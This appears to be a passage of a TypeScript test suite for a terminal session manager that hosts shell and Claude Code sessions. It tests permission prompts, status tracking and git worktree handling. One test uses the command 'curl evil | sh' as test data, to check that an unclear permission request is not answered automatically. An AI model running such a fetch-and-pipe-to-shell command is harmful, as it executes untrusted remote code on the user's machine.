import { existsSync, mkdirSync } from 'node:fs';
import { join } from 'node:path';
import { beforeEach, describe, expect, it, vi } from 'vitest';
import { defaultConfig, type Config } from '../../src/server/config.js';
import { mapIntoWorktree, SessionManager } from '../../src/server/session-manager.js';
import type { HookRequest } from '../../src/server/claude-launch.js';
import type { Profile, SessionInfo, Story, WorktreeListing } from '../../src/shared/types.js';
import { FakeClock, fakePtyFactory, useTempHome } from '../helpers.js';

const node = process.execPath;

describe('SessionManager', () => {
  const home = useTempHome();
  let clock: FakeClock;
  let ptys: ReturnType<typeof fakePtyFactory>;
  let config: Config;
  let mgr: SessionManager;
  let tmp: string;

  beforeEach(() => {
    clock = new FakeClock();
    ptys = fakePtyFactory();
    config = defaultConfig();
    tmp = join(home.dir(), 'work');
    mkdirSync(tmp);
    mgr = new SessionManager({
      ptyFactory: ptys.factory,
      now: clock.now,
      config: () => config,
      port: 7717,
      hookToken: 'hook-token',
      hookScriptPath: '/pkg/dist/hook/hook.js',
      statusScriptPath: '/pkg/dist/hook/statusline.js',
      builtins: () => [],
      gitOf: async () => null,
      headOf: () => null,
    });
  });

  const shell = (extra = {}): SessionInfo => mgr.create({ kind: 'shell', command: node, cwd: tmp, ...extra });
  const claude = (extra = {}): SessionInfo => mgr.create({ kind: 'claude', command: node, cwd: tmp, ...extra });

describe('order', () => {
    it('reorder changes list() and restorable(), and emits', () => {
      const a = shell({ name: 'a' });
      const b = shell({ name: 'b' });
      const c = shell({ name: 'c' });
      let changes = 0;
      mgr.onChange(() => changes++);
      mgr.reorder([c.id, 'nope', a.id, c.id]);
      expect(mgr.list().map((s) => s.id)).toEqual([c.id, a.id, b.id]);
      expect(mgr.restorable().map((r) => r.name)).toEqual(['c', 'a', 'b']);
      expect(changes).toBe(1);
    });

    it('profiles() follows profileOrder', () => {
      const mk = (id: string): Profile => ({ id, name: id, kind: 'shell', command: node, args: [], cwd: '', color: '#123456', env: {}, model: null, background: null, font: null });
      config.profiles = [mk('x'), mk('y')];
      config.profileOrder = ['y', 'ghost', 'x'];
      expect(mgr.profiles().map((p) => p.id)).toEqual(['y', 'x']);
    });
  });

  describe('create', () => {
    it('starts a shell as running and a claude session as idle', () => {
      expect(shell()).toMatchObject({ kind: 'shell', status: 'running', reason: null, exitCode: null, error: null, cols: 120, rows: 30 });
      expect(claude()).toMatchObject({ kind: 'claude', status: 'idle', reason: null });
      expect(mgr.list()).toHaveLength(2);
    });

    it('creates an exited session with an error when the folder is missing', () => {
      const s = mgr.create({ kind: 'shell', command: node, cwd: join(tmp, 'nope') });
      expect(s.status).toBe('exited');
      expect(s.error).toMatch(/folder/i);
      expect(ptys.ptys).toHaveLength(0);
      expect(mgr.get(s.id)).toEqual(s);
    });

    it('creates an exited session when the command does not resolve', () => {
      const s = mgr.create({ kind: 'shell', command: 'definitely-not-a-command-xyz', cwd: tmp });
      expect(s.status).toBe('exited');
      expect(s.error).toMatch(/not found/i);
    });

    it('creates an exited session when there is no command at all', () => {
      const s = mgr.create({});
      expect(s.status).toBe('exited');
      expect(s.error).toBeTruthy();
    });

    it('creates an exited session when the process cannot be started', () => {
      const failing = new SessionManager({
        ptyFactory: () => {
          throw new Error('access denied');
        },
        now: clock.now,
        config: () => config,
        port: 1,
        hookToken: 't',
        hookScriptPath: '/h.js', statusScriptPath: '/s.js',
        builtins: () => [],
        gitOf: async () => null,
        headOf: () => null,
      });
      const s = failing.create({ kind: 'shell', command: node, cwd: tmp });
      expect(s.status).toBe('exited');
      expect(s.error).toMatch(/access denied/);
    });

    it('accepts a folder with spaces and non-ASCII characters', () => {
      const dir = join(tmp, 'café – été');
      mkdirSync(dir);
      expect(mgr.create({ kind: 'shell', command: node, cwd: dir }).status).toBe('running');
      expect(ptys.last().opts.cwd).toBe(dir);
    });

    it('takes its settings from a saved profile, with the request winning', () => {
      const profile: Profile = { id: 'p1', name: 'My shell', kind: 'shell', command: node, args: ['-i'], cwd: tmp, color: '#112233', env: { FOO: 'bar' }, model: null };
      config.profiles = [profile];
      const s = mgr.create({ profileId: 'p1', name: 'Renamed' });
      expect(s).toMatchObject({ name: 'Renamed', color: '#112233', cwd: tmp, args: ['-i'], status: 'running' });
      expect(ptys.last().opts.env.FOO).toBe('bar');
      expect(ptys.last().launch.args).toEqual(['-i']);
    });

    it('reports an unknown profile as an error', () => {
      const s = mgr.create({ profileId: 'missing' });
      expect(s.status).toBe('exited');
      expect(s.error).toMatch(/launcher/i);
    });

    it('names a session after its command when nothing else is given', () => {
      expect(shell().name).toMatch(/^node/i);
      expect(shell({ name: '  ' }).name).toMatch(/^node/i);
    });

    it('launches a claude session with its own id, settings file, hook environment and model', () => {
      const s = claude({ model: 'opus' });
      const p = ptys.last();
      const args = p.launch.args;
      expect(args.slice(args.indexOf('--session-id'), args.indexOf('--session-id') + 2)).toEqual(['--session-id', s.id]);
      expect(args.slice(args.indexOf('--model'), args.indexOf('--model') + 2)).toEqual(['--model', 'opus']);
      expect(p.opts.env).toMatchObject({ SHELLYARD_SESSION_ID: s.id, SHELLYARD_PORT: '7717', SHELLYARD_HOOK_TOKEN: 'hook-token' });
      expect(existsSync(join(home.dir(), 'run', `${s.id}.settings.json`))).toBe(true);
      expect(s.model).toBe('opus');
    });

    it('does not pass Claude flags to a shell', () => {
      shell({ model: 'opus' });
      expect(ptys.last().launch.args).toEqual([]);
      expect(ptys.last().opts.env.SHELLYARD_SESSION_ID).toBeUndefined();
    });

    it('does not leak nested-session markers into hosted sessions', () => {
      process.env.CLAUDE_CODE_CHILD_SESSION = '1';
      try {
        shell();
        expect(ptys.last().opts.env.CLAUDE_CODE_CHILD_SESSION).toBeUndefined();
      } finally {
        delete process.env.CLAUDE_CODE_CHILD_SESSION;
      }
    });
  });

  describe('pending requests', () => {
    const bash = { kind: 'permission' as const, tool: 'Bash', detail: 'dotnet test', message: null };
    const shown = { kind: 'permission' as const, tool: 'Bash', detail: null, message: 'Claude needs your permission to use Bash' };
    /** A permission request, then the notification that its menu is on screen. */
    const ask = (id: string, req: HookRequest = bash, command: string | null = null): void => {
      mgr.hook(id, 'PermissionRequest', false, req, command);
      mgr.hook(id, 'Notification', false, shown);
    };

    it('blocks only once the menu is on screen, and forgets a request settled without the user', () => {
      const s = claude();
      mgr.hook(s.id, 'UserPromptSubmit', false);
      mgr.hook(s.id, 'PermissionRequest', false, bash);
      expect(mgr.get(s.id)).toMatchObject({ status: 'working', pending: { detail: 'dotnet test' } });
      // Another hook, or the permission mode, allowed it: the tool ran.
      mgr.hook(s.id, 'PostToolUse', false);
      expect(mgr.get(s.id)).toMatchObject({ status: 'working', pending: null });
    });

    it('keeps the request on screen while subagents report their own tools', () => {
      const s = claude();
      ask(s.id);
      mgr.hook(s.id, 'PreToolUse', false);
      mgr.hook(s.id, 'PostToolUse', false);
      expect(mgr.get(s.id)).toMatchObject({ status: 'attention', reason: 'blocked', pending: { detail: 'dotnet test' } });
    });

    it('records what a permission request asks, and forgets it once the session moves on', () => {
      const s = claude();
      mgr.hook(s.id, 'UserPromptSubmit', false);
      ask(s.id);
      const p = mgr.get(s.id)!.pending!;
      expect(mgr.get(s.id)).toMatchObject({ status: 'attention', reason: 'blocked' });
      expect(p).toMatchObject({ kind: 'permission', tool: 'Bash', detail: 'dotnet test', since: clock.now() });
      mgr.input(s.id, '1');
      expect(mgr.get(s.id)).toMatchObject({ status: 'working', pending: null });
    });

    it('keeps the full request when the notification of the same wait follows', () => {
      const s = claude();
      mgr.hook(s.id, 'PermissionRequest', false, bash);
      const id = mgr.get(s.id)!.pending!.id;
      mgr.hook(s.id, 'Notification', false, { kind: 'permission', tool: 'Bash', detail: null, message: 'Claude needs your permission to use Bash' });
      expect(mgr.get(s.id)!.pending).toMatchObject({ id, detail: 'dotnet test' });
    });

    it('gives each new permission request a new id, once the one before was settled', () => {
      const s = claude();
      mgr.hook(s.id, 'PermissionRequest', false, bash);
      const first = mgr.get(s.id)!.pending!.id;
      mgr.hook(s.id, 'PostToolUse', false);
      mgr.hook(s.id, 'PermissionRequest', false, { ...bash, detail: 'dotnet build' });
      expect(mgr.get(s.id)!.pending).toMatchObject({ detail: 'dotnet build' });
      expect(mgr.get(s.id)!.pending!.id).not.toBe(first);
    });

    it('shows the question Claude announced once it waits on it', () => {
      const s = claude();
      mgr.hook(s.id, 'PreToolUse', false, { kind: 'question', tool: 'AskUserQuestion', detail: 'Which version?', message: null });
      expect(mgr.get(s.id)!.pending).toBeNull();
      mgr.hook(s.id, 'Notification', false, { kind: 'question', tool: null, detail: null, message: 'Claude is waiting for your answer' });
      expect(mgr.get(s.id)!.pending).toMatchObject({ kind: 'question', tool: 'AskUserQuestion', detail: 'Which version?', message: 'Claude is waiting for your answer' });
    });

    it('does not carry an answered question over to a later wait', () => {
      const s = claude();
      mgr.hook(s.id, 'PreToolUse', false, { kind: 'question', tool: 'AskUserQuestion', detail: 'Which version?', message: null });
      mgr.hook(s.id, 'PostToolUse', false);
      mgr.hook(s.id, 'Notification', false, { kind: 'question', tool: null, detail: null, message: 'Waiting' });
      expect(mgr.get(s.id)!.pending).toMatchObject({ tool: null, detail: null, message: 'Waiting' });
    });

    it('records nothing for a session that is not blocked', () => {
      const s = claude();
      mgr.hook(s.id, 'Notification', true, { kind: 'question', tool: null, detail: null, message: 'x' });
      expect(mgr.get(s.id)).toMatchObject({ status: 'idle', pending: null });
    });

    it('answers the request on screen with the key of the choice', () => {
      const s = claude();
      ask(s.id);
      const id = mgr.get(s.id)!.pending!.id;
      expect(mgr.answer(s.id, id, 'once')).toBe('answered');
      expect(ptys.last().written).toEqual(['\r']);
      expect(mgr.get(s.id)).toMatchObject({ status: 'working', pending: null });

      ask(s.id);
      expect(mgr.answer(s.id, mgr.get(s.id)!.pending!.id, 'deny')).toBe('answered');
      expect(ptys.last().written).toEqual(['\r', '\x1b']);
    });

    it('refuses an answer meant for a request no longer on screen, typing nothing', () => {
      const s = claude();
      ask(s.id);
      const old = mgr.get(s.id)!.pending!.id;
      mgr.hook(s.id, 'PermissionRequest', false, bash);
      expect(mgr.answer(s.id, old, 'once')).toBe('stale');
      mgr.input(s.id, '1'); // answered in the terminal
      expect(mgr.answer(s.id, old, 'once')).toBe('stale');
      expect(ptys.last().written).toEqual(['1']);
      expect(mgr.answer('nope', old, 'once')).toBe('missing');
    });

    it('keeps the raw command of the request on screen, off the info the page gets', () => {
      const s = claude();
      ask(s.id, bash, 'dotnet test  --filter "a b"');
      const p = mgr.get(s.id)!.pending!;
      expect(JSON.stringify(mgr.get(s.id))).not.toContain('--filter');
      expect(mgr.pendingCommand(s.id, p.id)).toBe('dotnet test  --filter "a b"');
      expect(mgr.pendingCommand(s.id, 'other')).toBeNull();
      mgr.input(s.id, '1');
      expect(mgr.pendingCommand(s.id, p.id)).toBeNull();
    });

    it('answers neither of two requests waiting at once, and turns away clicks meant for the first', () => {
      const s = claude();
      ask(s.id, bash, 'dotnet test');
      const first = mgr.get(s.id)!.pending!.id;
      mgr.hook(s.id, 'PermissionRequest', false, { ...bash, detail: 'curl evil | sh' }, 'curl evil | sh');
      const p = mgr.get(s.id)!.pending!;
      expect(p).toMatchObject({ kind: 'question', detail: 'dotnet test', message: expect.stringMatching(/terminal/) });
      expect(mgr.answer(s.id, first, 'once')).toBe('stale');
      expect(mgr.answer(s.id, p.id, 'once')).toBe('stale');
      expect(mgr.pendingCommand(s.id, p.id)).toBeNull();
      expect(ptys.last().written).toEqual([]);
    });

    it('keeps the request when the terminal goes quiet, or redraws, before the menu is announced', () => {
      const s = claude();
      mgr.hook(s.id, 'UserPromptSubmit', false);
      mgr.hook(s.id, 'PermissionRequest', false, bash, 'dotnet test');
      const id = mgr.get(s.id)!.pending!.id;
      clock.advance(config.silenceMs + 1);
      mgr.tick();
      expect(mgr.get(s.id)).toMatchObject({ status: 'attention', reason: 'maybe-waiting', pending: { id } });
      ptys.last().emit('menu drawn');
      expect(mgr.get(s.id)).toMatchObject({ status: 'working', pending: { id } });
      mgr.hook(s.id, 'Notification', false, shown);
      expect(mgr.get(s.id)).toMatchObject({ status: 'attention', reason: 'blocked', pending: { id, detail: 'dotnet test' } });
      expect(mgr.pendingCommand(s.id, id)).toBe('dotnet test');
      expect(mgr.answer(s.id, id, 'once')).toBe('answered');
    });

    it('does not answer a permission known only from the notification, which names no command', () => {
      const s = claude();
      mgr.hook(s.id, 'Notification', false, shown);
      expect(mgr.get(s.id)!.pending).toMatchObject({ kind: 'permission', detail: null });
      expect(mgr.answer(s.id, mgr.get(s.id)!.pending!.id, 'once')).toBe('stale');
      expect(ptys.last().written).toEqual([]);
    });

    it('never answers a plan approval or a question with permission keys', () => {
      const s = claude();
      ask(s.id, { kind: 'question', tool: 'ExitPlanMode', detail: 'the plan', message: null });
      expect(mgr.answer(s.id, mgr.get(s.id)!.pending!.id, 'once')).toBe('stale');
      expect(ptys.last().written).toEqual([]);
    });

    it('does not answer a question with permission keys', () => {
      const s = claude();
      mgr.hook(s.id, 'Notification', false, { kind: 'question', tool: null, detail: null, message: 'Which?' });
      expect(mgr.answer(s.id, mgr.get(s.id)!.pending!.id, 'once')).toBe('stale');
      expect(ptys.last().written).toEqual([]);
    });
  });

  describe('typePrompt', () => {
    /** A Claude session whose main screen is up, as its first status line says. */
    const ready = (): SessionInfo => {
      const s = claude();
      mgr.noteStatusLine(s.id);
      return s;
    };

    it('types nothing into a session still starting', () => {
      const s = claude();
      expect(mgr.typePrompt(s.id, 'x')).toBe('starting');
      expect(ptys.last().written).toEqual([]);
      mgr.noteStatusLine(s.id);
      expect(mgr.typePrompt(s.id, 'x')).toBe('sent');
    });

    it('pastes the prompt into a session waiting at its prompt, then presses Enter', () => {
      vi.useFakeTimers();
      try {
        const s = ready();
        expect(mgr.typePrompt(s.id, 'Rebase on release/2026.12\nthen run the tests')).toBe('sent');
        expect(ptys.last().written).toEqual(['\x1b[200~Rebase on release/2026.12\nthen run the tests\x1b[201~']);
        vi.advanceTimersByTime(400);
        expect(ptys.last().written.at(-1)).toBe('\r');
      } finally {
        vi.useRealTimers();
      }
    });

    it('also takes a session that has finished its turn', () => {
      const s = ready();
      mgr.hook(s.id, 'Stop', false);
      expect(mgr.typePrompt(s.id, 'next')).toBe('sent');
    });

    it('types nothing into a session at work, blocked, a shell or an unknown one', () => {
      const working = ready();
      mgr.hook(working.id, 'UserPromptSubmit', false);
      const blocked = ready();
      mgr.hook(blocked.id, 'Notification', false);
      const sh = shell();
      expect(mgr.typePrompt(working.id, 'x')).toBe('busy');
      expect(mgr.typePrompt(blocked.id, 'x')).toBe('busy');
      expect(mgr.typePrompt(sh.id, 'x')).toBe('not-claude');
      expect(mgr.typePrompt('nope', 'x')).toBe('missing');
      for (const p of ptys.ptys) expect(p.written).toEqual([]);
    });

    it('does not press Enter once the session has moved on', () => {
      vi.useFakeTimers();
      try {
        const s = ready();
        mgr.typePrompt(s.id, 'x');
        mgr.hook(s.id, 'Notification', false);
        vi.advanceTimersByTime(400);
        expect(ptys.last().written).toEqual(['\x1b[200~x\x1b[201~']);
      } finally {
        vi.useRealTimers();
      }
    });
  });

  describe('status', () => {
    it('follows hook events', () => {
      const s = claude();
      expect(mgr.hook(s.id, 'UserPromptSubmit', false)).toBe(true);
      expect(mgr.get(s.id)).toMatchObject({ status: 'working', reason: null });
      mgr.hook(s.id, 'Notification', false);
      expect(mgr.get(s.id)).toMatchObject({ status: 'attention', reason: 'blocked' });
      mgr.hook(s.id, 'Stop', false);
      expect(mgr.get(s.id)).toMatchObject({ status: 'attention', reason: 'finished' });
    });

    it('rejects hooks for unknown and exited sessions', () => {
      expect(mgr.hook('nope', 'Stop', false)).toBe(false);
      const s = claude();
      ptys.last().exit(0);
      expect(mgr.hook(s.id, 'Stop', false)).toBe(false);
      expect(mgr.get(s.id)!.status).toBe('exited');
    });

    it('marks a working session maybe-waiting after 5000 ms of silence', () => {
      const s = claude();
      mgr.hook(s.id, 'UserPromptSubmit', false);
      clock.advance(4999);
      mgr.tick();
      expect(mgr.get(s.id)!.status).toBe('working');
      clock.advance(1);
      mgr.tick();
      expect(mgr.get(s.id)).toMatchObject({ status: 'attention', reason: 'maybe-waiting' });
    });

    it('measures silence from the moment work started, not from stale output', () => {
      const s = claude();
      ptys.last().emit('banner');
      clock.advance(600_000);
      mgr.hook(s.id, 'UserPromptSubmit', false);
      mgr.tick();
      expect(mgr.get(s.id)!.status).toBe('working');
    });

    it('uses the configured silence threshold', () => {
      config.silenceMs = 20_000;
      const s = claude();
      mgr.hook(s.id, 'UserPromptSubmit', false);
      clock.advance(19_000);
      mgr.tick();
      expect(mgr.get(s.id)!.status).toBe('working');
      clock.advance(1_000);
      mgr.tick();
      expect(mgr.get(s.id)!.status).toBe('attention');
    });

    it('output keeps a working session working', () => {
      const s = claude();
      mgr.hook(s.id, 'UserPromptSubmit', false);
      for (let i = 0; i < 10; i++) {
        clock.advance(1000);
        ptys.last().emit('.');
        mgr.tick();
      }
      expect(mgr.get(s.id)!.status).toBe('working');
    });

    it('the echo of the user typing does not count as the session being active', () => {
      const s = claude();
      mgr.hook(s.id, 'UserPromptSubmit', false);
      for (let i = 0; i < 6; i++) {
        clock.advance(1000);
        mgr.input(s.id, 'x');
        clock.advance(50);
        ptys.last().emit('x');
        mgr.tick();
      }
      expect(mgr.get(s.id)).toMatchObject({ status: 'attention', reason: 'maybe-waiting' });
    });

    it('never applies the silence rule to idle, finished or shell sessions', () => {
      const a = claude();
      const b = claude();
      mgr.hook(b.id, 'Stop', false);
      const c = shell();
      clock.advance(60_000);
      mgr.tick();
      expect(mgr.get(a.id)!.status).toBe('idle');
      expect(mgr.get(b.id)).toMatchObject({ status: 'attention', reason: 'finished' });
      expect(mgr.get(c.id)!.status).toBe('running');
    });

    function makeMaybeWaiting(): { s: SessionInfo; pty: ReturnType<typeof ptys.last> } {
      const s = claude();
      const pty = ptys.last();
      mgr.hook(s.id, 'UserPromptSubmit', false);
      clock.advance(5000);
      mgr.tick();
      expect(mgr.get(s.id)!.reason).toBe('maybe-waiting');
      return { s, pty };
    }

    it('echo within 500 ms of input does not clear maybe-waiting', () => {
      const { s, pty } = makeMaybeWaiting();
      mgr.input(s.id, 'h');
      clock.advance(100);
      pty.emit('h');
      expect(mgr.get(s.id)).toMatchObject({ status: 'attention', reason: 'maybe-waiting' });
    });

    it('unsolicited output clears maybe-waiting', () => {
      const { s, pty } = makeMaybeWaiting();
      mgr.input(s.id, 'h');
      clock.advance(600);
      pty.emit('Working…');
      expect(mgr.get(s.id)).toMatchObject({ status: 'working', reason: null });
    });

    it('the redraw a program does after a resize does not clear maybe-waiting', () => {
      // Showing a waiting session resizes its terminal, and the program repaints in response.
      const { s, pty } = makeMaybeWaiting();
      mgr.resize(s.id, 100, 40);
      clock.advance(300);
      pty.emit('\x1b[2J…full repaint…');
      clock.advance(900);
      pty.emit('…more repaint…');
      expect(mgr.get(s.id)).toMatchObject({ status: 'attention', reason: 'maybe-waiting' });
    });

    it('output well after a resize still clears maybe-waiting', () => {
      const { s, pty } = makeMaybeWaiting();
      mgr.resize(s.id, 100, 40);
      clock.advance(1600);
      pty.emit('Working…');
      expect(mgr.get(s.id)).toMatchObject({ status: 'working', reason: null });
    });

    it('a resize request that changes nothing opens no quiet window', () => {
      const { s, pty } = makeMaybeWaiting();
      mgr.resize(s.id, 120, 30);
      clock.advance(300);
      pty.emit('Working…');
      expect(mgr.get(s.id)).toMatchObject({ status: 'working', reason: null });
    });

    it('input on a blocked session moves it to working, and silence brings it back if nothing happens', () => {
      const s = claude();
      mgr.hook(s.id, 'PreToolUse', false);
      mgr.hook(s.id, 'Notification', false);
      mgr.input(s.id, '\x1b');
      expect(mgr.get(s.id)!.status).toBe('working');
      expect(ptys.last().written).toEqual(['\x1b']);
      clock.advance(5000);
      mgr.tick();
      expect(mgr.get(s.id)).toMatchObject({ status: 'attention', reason: 'maybe-waiting' });
    });

    it('a reply the terminal sends by itself is delivered but is not taken for the user answering', () => {
      const s = claude();
      mgr.hook(s.id, 'PreToolUse', false);
      mgr.hook(s.id, 'Notification', false);
      mgr.input(s.id, '\x1b[I');
      mgr.input(s.id, '\x1b[12;40R');
      expect(ptys.last().written).toEqual(['\x1b[I', '\x1b[12;40R']);
      expect(mgr.get(s.id)).toMatchObject({ status: 'attention', reason: 'blocked' });
    });

    it('a terminal reply does not open the echo window that hides real output', () => {
      const { s, pty } = makeMaybeWaiting();
      mgr.input(s.id, '\x1b[I');
      clock.advance(100);
      pty.emit('Working…');
      expect(mgr.get(s.id)).toMatchObject({ status: 'working', reason: null });
    });

    it('ack moves a finished session to idle', () => {
      const s = claude();
      mgr.hook(s.id, 'Stop', false);
      expect(mgr.ack(s.id)).toMatchObject({ status: 'idle', reason: null });
      expect(mgr.ack('nope')).toBeNull();
    });

    it('updates statusSince only when the status or reason changes', () => {
      const s = claude();
      clock.advance(10);
      mgr.hook(s.id, 'PreToolUse', false);
      const since = mgr.get(s.id)!.statusSince;
      expect(since).toBe(clock.now());
      clock.advance(10);
      mgr.hook(s.id, 'PostToolUse', false);
      expect(mgr.get(s.id)!.statusSince).toBe(since);
      clock.advance(10);
      mgr.hook(s.id, 'Stop', false);
      expect(mgr.get(s.id)!.statusSince).toBe(clock.now());
    });

    it('records the exit code, keeps the session listed and removes its settings file', () => {
      const s = claude();
      const settings = join(home.dir(), 'run', `${s.id}.settings.json`);
      expect(existsSync(settings)).toBe(true);
      ptys.last().exit(7);
      expect(mgr.get(s.id)).toMatchObject({ status: 'exited', exitCode: 7 });
      expect(mgr.list().map((x) => x.id)).toContain(s.id);
      expect(existsSync(settings)).toBe(false);
    });
  });

  describe('operations', () => {
    it('follows the model the session is really using, announcing only a real change', () => {
      const s = claude({ model: 'opus' });
      let changes = 0;
      mgr.onChange(() => changes++);
      mgr.setModel(s.id, 'Haiku 5.5');
      expect(mgr.get(s.id)!.model).toBe('Haiku 5.5');
      mgr.setModel(s.id, 'Haiku 5.5');
      mgr.setModel('nope', 'x');
      expect(changes).toBe(1);
    });

    it('renames and recolours', () => {
      const s = shell();
      expect(mgr.update(s.id, { name: 'build', color: '#00ff00' })).toMatchObject({ name: 'build', color: '#00ff00' });
      expect(mgr.update(s.id, { name: '   ' })!.name).toBe('build');
      expect(mgr.update('nope', { name: 'x' })).toBeNull();
    });

    it('forwards resize and exposes the new size', () => {
      const s = shell();
      mgr.resize(s.id, 100, 40);
      expect(ptys.last().resizes).toEqual([[100, 40]]);
      expect(mgr.get(s.id)).toMatchObject({ cols: 100, rows: 40 });
      mgr.resize('nope', 10, 10);
    });

    it('gives a snapshot for a live session, an empty one for a failed start, null for unknown', async () => {
      const s = shell();
      ptys.last().emit('hello');
      expect((await mgr.snapshot(s.id))?.data).toContain('hello');
      const failed = mgr.create({ kind: 'shell', command: 'definitely-not-a-command-xyz', cwd: tmp });
      expect((await mgr.snapshot(failed.id))?.data).toBe('');
      expect(await mgr.snapshot('nope')).toBeNull();
    });

    it('remove kills a running process and forgets the session', () => {
      const s = shell();
      const pty = ptys.last();
      expect(mgr.remove(s.id)).toBe(true);
      expect(pty.killed).toBe(true);
      expect(mgr.list()).toEqual([]);
      expect(mgr.get(s.id)).toBeNull();
      expect(mgr.remove(s.id)).toBe(false);
    });

    it('shutdown kills everything and cleans up', () => {
      const a = claude();
      shell();
      const [p1, p2] = ptys.ptys;
      mgr.shutdown();
      expect(p1!.killed && p2!.killed).toBe(true);
      expect(existsSync(join(home.dir(), 'run', `${a.id}.settings.json`))).toBe(false);
    });
  });

  describe('events', () => {
    it('announces every change with the full list', () => {
      const seen: SessionInfo[][] = [];
      mgr.onChange((s) => seen.push(s));
      const s = claude();
      expect(seen).toHaveLength(1);
      mgr.hook(s.id, 'UserPromptSubmit', false);
      expect(seen).toHaveLength(2);
      expect(seen[1]![0]!.status).toBe('working');
      mgr.hook(s.id, 'PreToolUse', false);
      expect(seen).toHaveLength(2);
      mgr.update(s.id, { name: 'x' });
      mgr.resize(s.id, 90, 20);
      mgr.remove(s.id);
      expect(seen).toHaveLength(5);
      expect(seen[4]).toEqual([]);
    });

    it('forwards output with the session id', () => {
      const out: Array<[string, string]> = [];
      mgr.onOutput((id, data) => out.push([id, data]));
      const s = shell();
      ptys.last().emit('abc');
      expect(out).toEqual([[s.id, 'abc']]);
    });
  });
});

describe('SessionManager git', () => {
  const home = useTempHome();
  let ptys: ReturnType<typeof fakePtyFactory>;
  let mgr: SessionManager;
  let work: string;
  let other: string;
  let listings: Map<string, WorktreeListing | null>;
  let heads: Map<string, { branch: string | null; head: string }>;
  let gitCalls: string[];

  const wt = (path: string, branch: string | null, isMain = false) => ({ path, branch, head: 'abc1234', isMain, locked: false, prunable: false, bare: false });
  const listing = (current: string, paths: string[]): WorktreeListing => ({
    current,
    worktrees: paths.map((p, i) => wt(p, 'main', i === 0)),
  });

  beforeEach(() => {
    ptys = fakePtyFactory();
    work = join(home.dir(), 'work');
    other = join(home.dir(), 'other');
    mkdirSync(work);
    mkdirSync(other);
    listings = new Map();
    heads = new Map();
    gitCalls = [];
    mgr = new SessionManager({
      ptyFactory: ptys.factory,
      now: new FakeClock().now,
      config: () => defaultConfig(),
      port: 7717,
      hookToken: 't',
      hookScriptPath: '/h.js',
      statusScriptPath: '/s.js',
      builtins: () => [],
      gitOf: async (folder) => {
        gitCalls.push(folder);
        return listings.get(folder) ?? null;
      },
      headOf: (w) => heads.get(w) ?? null,
    });
  });

  const shell = (cwd = work): SessionInfo => mgr.create({ kind: 'shell', command: node, cwd });
  const claude = (cwd = work): SessionInfo => mgr.create({ kind: 'claude', command: node, cwd });

  it('fills git after the session starts', async () => {
    listings.set(work, listing(work, [work, other]));
    let changes = 0;
    mgr.onChange(() => changes++);
    const s = shell();
    expect(s.git).toBeNull();
    expect(s.liveCwd).toBeNull();
    const before = changes;
    await vi.waitFor(() => expect(mgr.get(s.id)!.git).toEqual({ worktree: work, branch: 'main', head: 'abc1234', isMain: true, worktreeCount: 2 }));
    expect(changes).toBeGreaterThan(before);
  });

  it('git stays null outside a repository', async () => {
    const s = shell();
    await vi.waitFor(() => expect(gitCalls).toEqual([work]));
    await mgr.refreshGit(s.id);
    expect(mgr.get(s.id)!.git).toBeNull();
  });

  it('setLiveCwd moves a Claude session git to the reported worktree', async () => {
    listings.set(work, listing(work, [work, other]));
    listings.set(other, listing(other, [work, other]));
    const s = claude();
    await vi.waitFor(() => expect(mgr.get(s.id)!.git?.worktree).toBe(work));
    mgr.setLiveCwd(s.id, other);
    expect(mgr.get(s.id)!.liveCwd).toBe(other);
    await vi.waitFor(() => expect(mgr.get(s.id)!.git?.worktree).toBe(other));
    expect(gitCalls).toContain(other);
    expect(mgr.get(s.id)!.cwd).toBe(work);
  });

  it('setLiveCwd is ignored for shells, for relative paths and for missing folders', async () => {
    const sh = shell();
    const c = claude();
    await mgr.refreshGit(c.id);
    gitCalls.length = 0;
    mgr.setLiveCwd(sh.id, other);
    mgr.setLiveCwd(c.id, 'relative/dir');
    mgr.setLiveCwd(c.id, join(home.dir(), 'missing'));
    mgr.setLiveCwd(c.id, 42);
    expect(mgr.get(sh.id)!.liveCwd).toBeNull();
    expect(mgr.get(c.id)!.liveCwd).toBeNull();
    expect(gitCalls).toEqual([]);
  });

  it('live folder outside a repository clears git', async () => {
    listings.set(work, listing(work, [work]));
    const s = claude();
    await vi.waitFor(() => expect(mgr.get(s.id)!.git).not.toBeNull());
    mgr.setLiveCwd(s.id, other);
    await vi.waitFor(() => expect(mgr.get(s.id)!.git).toBeNull());
  });

  it('the last lookup started wins when two race', async () => {
    const resolvers: Array<(l: WorktreeListing | null) => void> = [];
    const racing = new SessionManager({
      ptyFactory: ptys.factory,
      now: new FakeClock().now,
      config: () => defaultConfig(),
      port: 1,
      hookToken: 't',
      hookScriptPath: '/h.js',
      statusScriptPath: '/s.js',
      builtins: () => [],
      gitOf: () => new Promise((r) => resolvers.push(r)),
    });
    const s = racing.create({ kind: 'shell', command: node, cwd: work });
    const second = racing.refreshGit(s.id);
    resolvers[1]!(listing(other, [other]));
    await second;
    resolvers[0]!(listing(work, [work]));
    await Promise.resolve();
    expect(racing.get(s.id)!.git?.worktree).toBe(other);
  });

  it('ignores a git answer for a session removed meanwhile', async () => {
    const resolvers: Array<(l: WorktreeListing | null) => void> = [];
    const m = new SessionManager({
      ptyFactory: ptys.factory,
      now: new FakeClock().now,
      config: () => defaultConfig(),
      port: 1,
      hookToken: 't',
      hookScriptPath: '/h.js',
      statusScriptPath: '/s.js',
      builtins: () => [],
      gitOf: () => new Promise((r) => resolvers.push(r)),
    });
    const s = m.create({ kind: 'shell', command: node, cwd: work });
    let changes = 0;
    m.remove(s.id);
    m.onChange(() => changes++);
    resolvers[0]!(listing(work, [work]));
    await Promise.resolve();
    await Promise.resolve();
    expect(changes).toBe(0);
    expect(m.get(s.id)).toBeNull();
  });

  it('refreshHeads updates the branch of running sessions only', async () => {
    listings.set(work, listing(work, [work]));
    const running = shell();
    const gone = shell();
    await vi.waitFor(() => {
      expect(mgr.get(running.id)!.git).not.toBeNull();
      expect(mgr.get(gone.id)!.git).not.toBeNull();
    });
    ptys.ptys[1]!.exit(0);
    expect(mgr.get(gone.id)!.status).toBe('exited');
    heads.set(work, { branch: 'feature', head: 'def5678' });
    let changes = 0;
    mgr.onChange(() => changes++);
    mgr.refreshHeads();
    expect(mgr.get(running.id)!.git).toMatchObject({ branch: 'feature', head: 'def5678', worktreeCount: 1 });
    expect(mgr.get(gone.id)!.git).toMatchObject({ branch: 'main', head: 'abc1234' });
    expect(changes).toBe(1);
    mgr.refreshHeads();
    expect(changes).toBe(1);
  });

  it('refreshGitIn updates worktreeCount of every session in the repo', async () => {
    listings.set(work, listing(work, [work]));
